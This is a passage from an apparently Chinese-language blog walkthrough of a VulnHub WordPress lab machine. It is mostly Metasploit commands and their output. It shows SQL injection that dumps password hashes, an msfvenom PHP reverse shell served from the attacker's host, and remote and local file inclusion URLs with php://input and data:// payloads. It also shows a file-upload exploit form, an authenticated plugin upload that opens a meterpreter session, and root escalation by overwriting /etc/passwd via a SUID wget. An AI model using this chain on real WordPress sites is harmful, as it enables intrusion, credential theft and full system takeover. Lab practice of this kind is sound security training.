(auxiliary/admin/http/wp_symposium_sql_injection):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   Proxies                      <span class="literal">no</span>        A<span class="built_in"> proxy </span>chain of format type:host:port[,type:host:port][<span class="built_in">..</span>.]</span><br><span class="line">   RHOSTS                       <span class="literal">yes</span>       The target<span class="built_in"> address </span>range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT       80               <span class="literal">yes</span>       The target<span class="built_in"> port </span>(TCP)</span><br><span class="line">   SSL         <span class="literal">false</span>            <span class="literal">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI   /                <span class="literal">yes</span>       The base path <span class="keyword">to</span> the wordpress application</span><br><span class="line">   URI_PLUGIN  wp-symposium     <span class="literal">yes</span>       The WordPress Symposium Plugin URI</span><br><span class="line">   VHOST                        <span class="literal">no</span>        HTTP<span class="built_in"> server </span>virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(admin/http/wp_symposium_sql_injection) &gt; <span class="builtin-name">set</span> rhosts 192.168.116.138</span><br><span class="line">rhosts =&gt; 192.168.116.138</span><br><span class="line">msf5 auxiliary(admin/http/wp_symposium_sql_injection) &gt; <span class="builtin-name">set</span> targeturi /wordpress</span><br><span class="line">targeturi =&gt; /wordpress</span><br><span class="line">msf5 auxiliary(admin/http/wp_symposium_sql_injection) &gt; <span class="builtin-name">run</span> </span><br><span class="line">[*] Running module against 192.168.116.138</span><br><span class="line"></span><br><span class="line">[+] 192.168.116.138:80 - admin           <span class="variable">$P</span><span class="variable">$BYWgfD7pa572QS9YFoeVVmhrIhBAx0</span>. abc@gmail.com</span><br><span class="line">[+] 192.168.116.138:80 -                                                    </span><br><span class="line">[+] 192.168.116.138:80 - aarti           <span class="variable">$P</span><span class="variable">$BHyn</span>.q5e5/HG9/UT/Ow3xkH2xXsikx0 aarti@gmail.com</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf5 auxiliary(admin/http/wp_symposium_sql_injection) &gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>SQL注入获取到了密码，但是加密了，john爆破无果。</p>
</li>
<li><p>回去看第一个session，切换到home目录找到第一个flag。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">cd</span> raj</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /home/raj</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100600/rw-------  4770  fil   2019-09-11 12:54:51 +0800  .ICEauthority</span><br><span class="line">100600/rw-------  232   fil   2019-09-11 12:57:45 +0800  .bash_history</span><br><span class="line">100644/rw-r--r--  220   fil   2019-09-09 14:15:07 +0800  .bash_logout</span><br><span class="line">100644/rw-r--r--  3771  fil   2019-09-09 14:15:07 +0800  .bashrc</span><br><span class="line">40700/rwx------   4096  dir   2019-09-09 23:47:31 +0800  .cache</span><br><span class="line">40700/rwx------   4096  dir   2019-09-09 21:20:39 +0800  .config</span><br><span class="line">40700/rwx------   4096  dir   2019-09-09 21:20:05 +0800  .dbus</span><br><span class="line">40700/rwx------   4096  dir   2019-09-09 15:51:12 +0800  .gnupg</span><br><span class="line">40700/rwx------   4096  dir   2019-09-09 21:20:06 +0800  .gvfs</span><br><span class="line">40700/rwx------   4096  dir   2019-09-09 14:20:30 +0800  .<span class="built_in">local</span></span><br><span class="line">40700/rwx------   4096  dir   2019-09-09 14:34:23 +0800  .mozilla</span><br><span class="line">100600/rw-------  39    fil   2019-09-09 15:23:00 +0800  .mysql_history</span><br><span class="line">100644/rw-r--r--  807   fil   2019-09-09 14:15:07 +0800  .profile</span><br><span class="line">40700/rwx------   4096  dir   2019-09-09 15:51:12 +0800  .ssh</span><br><span class="line">100644/rw-r--r--  0     fil   2019-09-09 14:21:21 +0800  .sudo_as_admin_successful</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-09-10 00:23:02 +0800  Desktop</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-09-09 14:20:38 +0800  Documents</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-09-09 16:23:53 +0800  Downloads</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-09-09 14:20:38 +0800  Music</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-09-09 14:20:38 +0800  Pictures</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-09-09 14:20:38 +0800  Public</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-09-09 14:20:38 +0800  Templates</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-09-09 14:20:38 +0800  Videos</span><br><span class="line">100644/rw-r--r--  8980  fil   2019-09-09 14:15:07 +0800  examples.desktop</span><br><span class="line">100644/rw-r--r--  41    fil   2019-09-10 12:06:56 +0800  flag1.txt</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-09-09 16:18:54 +0800  plugin</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cat flag1.txt</span><br><span class="line">aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu</span><br><span class="line">meterpreter &gt; </span><br><span class="line">➜  VulnHub <span class="built_in">echo</span> <span class="string">"aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu"</span> |base64 -d</span><br><span class="line">https://www.hackingarticles.in%</span><br></pre></td></tr></table></figure>
<ul>
<li>在网站的跟目录发现了一个notes.txt文件和一个加密了的zip压缩包</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu<span class="symbol">:/var/www/html</span>$ ls</span><br><span class="line">ls</span><br><span class="line">index.html  info.php  notes.txt  secret.zip  wordpress</span><br><span class="line">www-data@ubuntu<span class="symbol">:/var/www/html</span>$ cat notes.txt</span><br><span class="line">cat notes.txt</span><br><span class="line">You Need to ZIP Your Wayout</span><br><span class="line">www-data@ubuntu<span class="symbol">:/var/www/html</span>$ cat info.php</span><br><span class="line">cat info.php</span><br><span class="line">&lt;?php</span><br><span class="line">echo $_SERVER[<span class="string">'HTTP_HOST'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">www-data@ubuntu<span class="symbol">:/var/www/html</span>$</span><br></pre></td></tr></table></figure>
<ul>
<li>密码是上面SQL注入获取到admin密码的Hash</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  VulnHub unzip secret.zip                                          </span><br><span class="line">Archive:  secret.zip</span><br><span class="line">[secret.zip] link.txt password: </span><br><span class="line">  inflating: link.txt                </span><br><span class="line">➜  VulnHub cat link.txt    </span><br><span class="line">https://www.exploit-db.com/exploits/38861</span><br><span class="line">https://www.exploit-db.com/exploits/40290</span><br><span class="line">https://www.exploit-db.com/exploits/36374</span><br><span class="line">https://www.exploit-db.com/exploits/37824</span><br><span class="line">https://www.exploit-db.com/exploits/41006%</span><br><span class="line">➜  VulnHub</span><br></pre></td></tr></table></figure>
<ul>
<li>发现是一堆链接，好像就是我用wpscan扫出来的那些，所以好像没有什么作用，结合notes.txt提示，只是告诉你可以使用多种方法获取Shell。</li>
</ul>
<h2 id="CVE-2015-8351-远程文件包含"><a href="#CVE-2015-8351-远程文件包含" class="headerlink" title="CVE-2015-8351 远程文件包含"></a>CVE-2015-8351 远程文件包含</h2><ul>
<li>第一个，远程文件包含</li>
<li>开启MSF监听端口</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 2333</span><br><span class="line">lport =&gt; 2333</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 192.168.116.1</span><br><span class="line">lhost =&gt; 192.168.116.1</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.116.1    <span class="literal">yes</span>       The listen<span class="built_in"> address </span>(an<span class="built_in"> interface </span>may be specified)</span><br><span class="line">   LPORT  2333             <span class="literal">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">run</span> </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.116.1:2333 </span><br><span class="line">[*] Sending stage (38247 bytes) <span class="keyword">to</span> 192.168.116.138</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.116.1:2333 -&gt; 192.168.116.138:42968) at 2019-09-26 11:45:39 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>搭建http，把shell改名为wp-load.php，启动http服务。</li>
</ul>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  VulnHub msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="number">192.168.116.1</span> LPORT=<span class="number">2333</span> -o shell.php</span><br><span class="line"><span class="string">[-]</span> No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line"><span class="string">[-]</span> No arch selected, selecting arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">1114</span> bytes</span><br><span class="line">Saved as: shell.php</span><br><span class="line">➜  VulnHub python3.<span class="number">7</span> -m http.server                                                           </span><br><span class="line">Serving HTTP on <span class="number">0.0.0.0</span> port <span class="number">8000</span> (http://<span class="number">0.0.0.0:8000</span>/) ...</span><br><span class="line"><span class="number">192.168.116.138</span> - - <span class="string">[26/Sep/2019 11:45:11]</span> code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168.116.138</span> - - <span class="string">[26/Sep/2019 11:45:11]</span> <span class="string">"<span class="keyword">GET</span> /shell.phpwp-load.php HTTP/1.0"</span> <span class="number">404</span> -</span><br><span class="line">^C</span><br><span class="line">Keyboard interrupt received, exiting.</span><br><span class="line">➜  VulnHub </span><br><span class="line">➜  VulnHub cp shell.php wp-load.php</span><br><span class="line">➜  VulnHub python3.<span class="number">7</span> -m http.server</span><br><span class="line">Serving HTTP on <span class="number">0.0.0.0</span> port <span class="number">8000</span> (http://<span class="number">0.0.0.0:8000</span>/) ...</span><br><span class="line"><span class="number">192.168.116.138</span> - - <span class="string">[26/Sep/2019 11:45:39]</span> <span class="string">"<span class="keyword">GET</span> /wp-load.php HTTP/1.0"</span> <span class="number">200</span> -</span><br></pre></td></tr></table></figure>
<ul>
<li>访问<code>http://192.168.116.138/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.116.1:8000/</code>，获取会话成功。</li>
</ul>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ul>
<li><p>敏感信息：<code>/etc/apache2/.htpasswd</code></p>
</li>
<li><p>描述上说是本地文件包含，但是我测的时候可以远程文件包含，所以也获取命令执行更简单了。</p>
</li>
<li><p>访问<code>http://192.168.116.138/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=http://192.168.116.1:8000/shell.php</code>就可以获取远程会话了。</p>
</li>
<li><p>本地包含的思路有上传有恶意php代码的文件，找到上传路径，然后包含获取会话。</p>
</li>
<li>然后可以包含日志文件可以想办法将一句话存进日志中，一般有Apache的访问日志，ssh链接的失败日志，这主要看服务器开放了哪些服务。但是这台就有点坑，只开了一个Apache，还读不了日志。</li>
<li>但是还是有办法的，还有php支持的各种协议。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.116.138/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg==</span><br><span class="line"></span><br><span class="line">➜  ~ curl <span class="string">"http://192.168.116.138/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input"</span> -d <span class="string">"&lt;?php phpinfo();?&gt;"</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在PHPinfo里看到支持的协议还挺多的</li>
</ul>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">https</span>, ftps, <span class="built_in">compress</span>.zlib, php, <span class="built_in">file</span>, glob, data, <span class="keyword">http</span>, <span class="keyword">ftp</span>, <span class="built_in">compress</span>.bzip2, phar, zip</span><br></pre></td></tr></table></figure>
<ul>
<li>一句话木马我就不演示了。</li>
</ul>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
<li><a href="https://www.exploit-db.com/exploits/36374" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36374</a></li>
<li>exp里要改的有主机和端口，年份月分也改一个存在的目录。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"http://192.168.116.138/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2019&amp;Month=09"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"qqfile"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"Pwn!"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器打开，选择木马上传，打开上传目录访问木马，就可以了。</li>
</ul>
<h2 id="CSRF越权"><a href="#CSRF越权" class="headerlink" title="CSRF越权"></a>CSRF越权</h2><ul>
<li><a href="https://www.exploit-db.com/exploits/41006" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41006</a></li>
<li>登录后在垃圾桶找到一篇文章，里面有他的密码。</li>
</ul>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Admin Password: Ignite<span class="symbol">@123</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在Aarti用户的详情里找到了Root密码<code>Ignite@123</code>和第二个flag。</li>
</ul>
<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Second Flag</span>: 5DD1CC591CE1569A528E3BCF18CEEB5B</span><br><span class="line"></span><br><span class="line"><span class="attribute">RootPassword</span>: SWduaXRlQDEyMw==</span><br></pre></td></tr></table></figure>
<ul>
<li>密码都是一样的。</li>
</ul>
<h2 id="插件认证文件上传"><a href="#插件认证文件上传" class="headerlink" title="插件认证文件上传"></a>插件认证文件上传</h2><ul>
<li>上面有一个利用要用到密码，我都拿到密码了，我还要用exp？</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/wp_slideshowgallery_upload):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS       192.168.116.138  yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI    /wordpress       yes       The base path to the wordpress application</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line">   WP_PASSWORD  Ignite@123       yes       Valid password <span class="keyword">for</span> the provided username</span><br><span class="line">   WP_USER      admin            yes       A valid username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   WP SlideShow Gallery 1.4.6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.116.1:4444 </span><br><span class="line">[*] Trying to login as admin</span><br><span class="line">[*] Trying to upload payload</span><br><span class="line">[*] Uploading payload</span><br><span class="line">[*] Calling uploaded file gxwuywll.php</span><br><span class="line">[*] Sending stage (38247 bytes) to 192.168.116.138</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.116.1:4444 -&gt; 192.168.116.138:41014) at 2019-09-26 18:24:09 +0800</span><br><span class="line">[+] Deleted gxwuywll.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>情节需要，不管了。</li>
</ul>
<h2 id="提Root权权限"><a href="#提Root权权限" class="headerlink" title="提Root权权限"></a>提Root权权限</h2><ul>
<li>随便选一个session，进入Shell，查找SUID权限文件。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2084 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">www-data@ubuntu:/var/www$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/arping</span><br><span class="line">/usr/bin/wget</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/cp</span><br><span class="line">/bin/su</span><br><span class="line">/snap/core/6350/bin/mount</span><br><span class="line">/snap/core/6350/bin/ping</span><br><span class="line">/snap/core/6350/bin/ping6</span><br><span class="line">/snap/core/6350/bin/su</span><br><span class="line">/snap/core/6350/bin/umount</span><br><span class="line">/snap/core/6350/usr/bin/chfn</span><br><span class="line">/snap/core/6350/usr/bin/chsh</span><br><span class="line">/snap/core/6350/usr/bin/gpasswd</span><br><span class="line">/snap/core/6350/usr/bin/newgrp</span><br><span class="line">/snap/core/6350/usr/bin/passwd</span><br><span class="line">/snap/core/6350/usr/bin/sudo</span><br><span class="line">/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/6350/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/6350/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/6350/usr/sbin/pppd</span><br><span class="line">www-data@ubuntu:/var/www$</span><br></pre></td></tr></table></figure>
<ul>
<li>看到有cp和wget命令，两个都能覆盖文件，就是把passwd文件改了</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/etc$ wget -O passwd http://192.168.116.1:8000/passwd</span><br><span class="line">wget -O passwd http://192.168.116.1:8000/passwd</span><br><span class="line">ERROR: could not open HSTS store. HSTS will be disabled.</span><br><span class="line">--2019-09-26 11:54:08--  http://192.168.116.1:8000/passwd</span><br><span class="line">Connecting to 192.168.116.1:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2557 (2.5K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">'passwd'</span></span><br><span class="line"></span><br><span class="line">passwd              100%[===================&gt;]   2.50K  --.-KB/s    <span class="keyword">in</span> 0.001s  </span><br><span class="line"></span><br><span class="line">2019-09-26 11:54:08 (2.86 MB/s) - <span class="string">'passwd'</span> saved [2557/2557]</span><br><span class="line"></span><br><span class="line">www-data@ubuntu:/etc$ cat passwd</span><br><span class="line">cat passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span 